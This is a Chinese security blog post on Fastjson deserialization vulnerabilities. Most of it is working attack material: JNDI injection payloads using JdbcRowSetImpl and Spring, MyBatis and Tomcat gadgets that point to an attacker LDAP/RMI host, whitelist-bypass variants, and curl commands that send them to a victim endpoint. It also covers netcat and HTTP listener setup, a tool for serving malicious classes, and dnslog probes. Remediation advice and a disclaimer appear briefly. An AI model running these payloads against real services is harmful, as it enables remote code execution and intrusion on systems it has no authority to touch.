+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#尝试访问内网</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#dnslog探测出网</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;qwq&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>原理</strong>：<br>当 Fastjson 解析 <code>autoCommit</code> 属性时，会调用 <code>setAutoCommit(true)</code> → 触发 JNDI 查找 → 访问 <code>dataSourceName</code> 中的地址。</p>
+<hr>
+<p>使用工具<code>jndi_tool.jar</code>部署恶意类；工具链接：<a target="_blank" rel="noopener" href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://xxx.xxx.xx.x:xxx/Object&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-启动-HTTP-监听服务"><a href="#2-启动-HTTP-监听服务" class="headerlink" title="2. 启动 HTTP 监听服务"></a>2. 启动 HTTP 监听服务</h4><p>在 <code>192.168.1.12</code> 上执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>或使用 <code>nc</code> 监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8000</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-发送-Payload-到目标"><a href="#3-发送-Payload-到目标" class="headerlink" title="3. 发送 Payload 到目标"></a>3. 发送 Payload 到目标</h4><p>将 Payload 作为 POST 数据发送到目标 Fastjson 接口（如 <code>/json</code>）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/api -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="string">  &quot;dataSourceName&quot;: &quot;ldap://192.168.1.12:8000/Exploit&quot;,</span></span><br><span class="line"><span class="string">  &quot;autoCommit&quot;: true</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-验证漏洞"><a href="#4-验证漏洞" class="headerlink" title="4. 验证漏洞"></a>4. 验证漏洞</h4><ul>
+<li><p>若在 <code>192.168.1.12:8000</code> 的 HTTP 服务收到 <strong>GET 请求</strong>（路径 <code>/Exploit</code>），证明漏洞存在。</p>
+</li>
+<li><p>示例日志：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.X.X - - [TIMESTAMP] &quot;GET /Exploit HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
+<li><p><strong>依赖要求</strong>：<br>目标需存在 <code>JdbcRowSetImpl</code> 类（通常满足），若返回 <code>Class not found</code> 则说明环境缺失依赖。</p>
+</li>
+<li><p><strong>网络可达</strong>：<br>确保目标服务器能访问 <code>192.168.1.12:8000</code>（检查防火墙&#x2F;路由）。</p>
+</li>
+<li><p><strong>安全模式</strong>：<br>若目标开启 <code>safeMode</code>（禁用 <code>autoType</code>），Payload 将失效：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="literal">true</span>);  <span class="comment">// 免疫漏洞</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>无 RCE 风险</strong>：<br>此 Payload 仅触发 HTTP 请求，<strong>不会执行任意代码</strong>，符合安全测试要求。</p>
+</li>
+</ol>
+<hr>
+<h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><ul>
+<li><strong>更高版本影响</strong>：Fastjson ≥1.2.84 默认关闭 autoType，需手动开启白名单。</li>
+<li><strong>修复建议</strong>：<ul>
+<li>升级 <code>Fastjson</code> 至最新版</li>
+<li>启用 <code>safeMode</code></li>
+<li>配置 <code>autoType</code> 白名单</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>以上方法仅用于安全测试，请遵守法律法规。确认漏洞后请及时修复。</p>
+</blockquote>
+<hr>
+<h1 id="Fastjson-1-2-80-反序列化漏洞详细分析（含白名单场景）"><a href="#Fastjson-1-2-80-反序列化漏洞详细分析（含白名单场景）" class="headerlink" title="Fastjson 1.2.80 反序列化漏洞详细分析（含白名单场景）"></a>Fastjson 1.2.80 反序列化漏洞详细分析（含白名单场景）</h1><h4 id="报错分析"><a href="#报错分析" class="headerlink" title="报错分析"></a>报错分析</h4><p>若存在报错 <code>org.springframework.http.converter.HttpMessageNotReadableException</code> 表明：</p>
+<ol>
+<li><strong>Spring MVC 正在处理请求</strong>，且使用了内置的 HTTP 消息转换器</li>
+<li><strong>请求体解析失败</strong>，可能是 Fastjson 在处理恶意 payload 时抛出的异常</li>
+<li><strong>环境包含 Spring&#x2F;MyBatis</strong> 可能扩展了攻击面</li>
+</ol>
+<hr>
+<h3 id="白名单配置检查"><a href="#白名单配置检查" class="headerlink" title="白名单配置检查"></a>白名单配置检查</h3><p>当存在以下配置时，Fastjson 可能允许特定类被反序列化（绕过防护）：</p>
+<h4 id="1-显式白名单配置"><a href="#1-显式白名单配置" class="headerlink" title="1. 显式白名单配置"></a>1. 显式白名单配置</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 危险的白名单配置示例</span></span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;com.sun.rowset.&quot;</span>);</span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;org.apache.tomcat.&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-AutoType-白名单"><a href="#2-AutoType-白名单" class="headerlink" title="2. AutoType 白名单"></a>2. AutoType 白名单</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 启用 AutoType 并添加白名单</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;com.example.safe.&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-特定注解使用"><a href="#3-特定注解使用" class="headerlink" title="3. 特定注解使用"></a>3. 特定注解使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JSONType(autoTypeCheckHandler = MySafeHandler.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">// 可能被利用的 setter 方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="针对环境的增强-Payload"><a href="#针对环境的增强-Payload" class="headerlink" title="针对环境的增强 Payload"></a>针对环境的增强 Payload</h3><p>结合 Spring + MyBatis 环境，以下 payload 可能更有效（目标：触发对 <code>192.168.1.12:8000</code> 的访问）：</p>
+<h4 id="方案-1：MyBatis-SQL-驱动类利用"><a href="#方案-1：MyBatis-SQL-驱动类利用" class="headerlink" title="方案 1：MyBatis SQL 驱动类利用"></a>方案 1：MyBatis SQL 驱动类利用</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方案-2：Spring-JNDI-扩展"><a href="#方案-2：Spring-JNDI-扩展" class="headerlink" title="方案 2：Spring JNDI 扩展"></a>方案 2：Spring JNDI 扩展</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方案-3：Tomcat-JDBC-池利用"><a href="#方案-3：Tomcat-JDBC-池利用" class="headerlink" title="方案 3：Tomcat JDBC 池利用"></a>方案 3：Tomcat JDBC 池利用</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="漏洞验证步骤"><a href="#漏洞验证步骤" class="headerlink" title="漏洞验证步骤"></a>漏洞验证步骤</h3><h4 id="1-启动-HTTP-监控"><a href="#1-启动-HTTP-监控" class="headerlink" title="1. 启动 HTTP 监控"></a>1. 启动 HTTP 监控</h4><p>在 <code>192.168.1.12</code> 执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 3 (记录完整请求)</span></span><br><span class="line"><span class="comment"># linux</span></span><br><span class="line">python3 -m http.server 8000 2&gt;&amp;1 | <span class="built_in">tee</span> http.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line"><span class="comment">#powershell</span></span><br><span class="line">python -m http.server 8000 2&gt;&amp;1 | Tee-Object -FilePath http.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#cmd.exe</span></span><br><span class="line">python -m http.server 8000 &gt; http.log 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用 netcat</span></span><br><span class="line">nc -lvnp 8000</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-发送恶意请求"><a href="#2-发送恶意请求" class="headerlink" title="2. 发送恶意请求"></a>2. 发送恶意请求</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://VICTIM_IP:PORT/vuln-endpoint \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="string">    &quot;dataSourceName&quot;: &quot;ldap://192.168.1.12:8000/FastjsonPoc&quot;,</span></span><br><span class="line"><span class="string">    &quot;autoCommit&quot;: true</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-验证成功标志"><a href="#3-验证成功标志" class="headerlink" title="3. 验证成功标志"></a>3. 验证成功标志</h4><p>在 HTTP 服务器查看访问日志：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /FastjsonPoc - 来自目标 IP 的请求</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="白名单绕过技巧"><a href="#白名单绕过技巧" class="headerlink" title="白名单绕过技巧"></a>白名单绕过技巧</h3><p>若目标配置了白名单，尝试这些变体：</p>
+<h4 id="1-类名混淆"><a href="#1-类名混淆" class="headerlink" title="1. 类名混淆"></a>1. 类名混淆</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Bypass1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-嵌套白名单类"><a href="#2-嵌套白名单类" class="headerlink" title="2. 嵌套白名单类"></a>2. 嵌套白名单类</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;beanFactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ldap://192.168.1.12:8000/Bypass2&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-MyBatis-别名利用"><a href="#3-MyBatis-别名利用" class="headerlink" title="3. MyBatis 别名利用"></a>3. MyBatis 别名利用</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.type.Alias&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Bypass3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="防护检测建议"><a href="#防护检测建议" class="headerlink" title="防护检测建议"></a>防护检测建议</h3><ol>
+<li><p><strong>检查 AutoType 状态</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回 true 表示危险</span></span><br><span class="line">ParserConfig.getGlobalInstance().isAutoTypeSupport();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>列出所有白名单</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().getAcceptList()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>安全配置示例</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最佳安全实践</span></span><br><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<h2 id="结果分析矩阵"><a href="#结果分析矩阵" class="headerlink" title="结果分析矩阵"></a>结果分析矩阵</h2><table>
+<thead>
+<tr>
+<th align="left">观察现象</th>
+<th align="left">漏洞可能性</th>
+<th align="left">建议行动</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">HTTP 服务器收到 GET 请求</td>
+<td align="left">✅ 确认存在</td>
+<td align="left">立即修复</td>
+</tr>
+<tr>
+<td align="left">返回 <code>Class not found</code> 错误</td>
+<td align="left">⚠️ 可能存在</td>
+<td align="left">尝试其他 gadget 类</td>
+</tr>
+<tr>
+<td align="left">返回 <code>autoType not support</code> 错误</td>
+<td align="left">🛡️ 可能已防护</td>
+<td align="left">检查安全配置</td>
+</tr>
+<tr>
+<td align="left">连接超时</td>
+<td align="left">不确定</td>
+<td align="left">检查网络策略&#x2F;防火墙</td>
+</tr>
+<tr>
+<td align="left">持续抛出 <code>HttpMessageNotReadable</code></td>
+<td align="left">⚠️ 高可能性</td>
+<td align="left">分析完整异常栈</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p> 即使未观察到直接请求，<code>HttpMessageNotReadableException</code> 异常本身可能已表明 payload 触发了非预期行为，建议结合日志深度分析。</p>
+<p><strong>注意：</strong></p>
+<p>如下是进行dnslog，即便collaborator有反应也不能说明存在RCE，只能说明存在dns解析</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxxxxxxcollaboratorxxxxxxxxxx.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://xxxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>乌篷船
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://blog.cliayn.top/2025/07/08/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="fastjson反序列化分析">https://blog.cliayn.top/2025/07/08/Fastjson反序列化漏洞分析/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" rel="noopener" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/article/" rel="tag"># article</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/07/02/spring%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E4%BF%AE%E5%A4%8D/" rel="prev" title="spring常见报错构造发包">
+                  <i class="fa fa-angle-left"></i> spring常见报错构造发包
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/08/03/%E6%B9%96%E6%B9%98%E6%9D%AF%E8%AE%B0%E5%BD%95/" rel="next" title="湖湘杯记录">
+                  湖湘杯记录 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa-regular fa-user"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">乌篷船</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">246k</span>
+  </span>
+</div><script src="https://cliayn.github.io/js/typed.js"></script>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    // 获取你在 _config.yml 中定义的感悟列表
+    // 注意：Hexo 在渲染时会将 config 变量注入
+    var sayings = ["可以自由支配的时间，也就是真正的财富。","我当然是正态分布下的蠢材<br>可是啊<br>人生=δ(x−相信)"];
+    
+    if (sayings && sayings.length > 0) {
+      // 找到 NexT 的 subtitle 元素
+      var subtitleElement = document.querySelector('.site-subtitle');
+      
+      if (subtitleElement) {
+        // 清空原有文字
+        subtitleElement.innerHTML = '<span id="typed-subtitle"></span>';
+        
+        // 初始化 Typed.js
+        new Typed('#typed-subtitle', {
+          strings: sayings,
+          typeSpeed: 70,     // 打字速度
+          backSpeed: 30,     // 回退速度
+          backDelay: 5000,   // 展示后的停顿时间（毫秒）
+          loop: true,        // 是否循环
+          smartBackspace: true
+        });
+      }
+    }
+  });
+</script>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/cliayn" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+<div id="bg-toggle-btn" class="day-night-switch">
+  <i id="bg-toggle-icon" class="fa fa-moon"></i>
+</div>
+
+<script>
+(function() {
+  var btn = document.getElementById('bg-toggle-btn');
+  var icon = document.getElementById('bg-toggle-icon');
+  
+  // 定义图片路径
+  var pic1 = 'url("/images/background.jpg")'; // 默认/白天背景
+  var pic2 = 'url("/images/ai-background.png")'; // 切换/夜晚背景
+
+  // 检查本地存储中是否有记录，保持刷新后状态一致
+  var isNight = localStorage.getItem('isNight') === 'true';
+
+  // 初始化页面状态函数
+  function applyState() {
+    if (isNight) {
+      // 如果是夜晚模式：显示太阳图标，背景换成 pic2
+      document.body.style.backgroundImage = pic2;
+      icon.className = 'fa fa-sun'; 
+    } else {
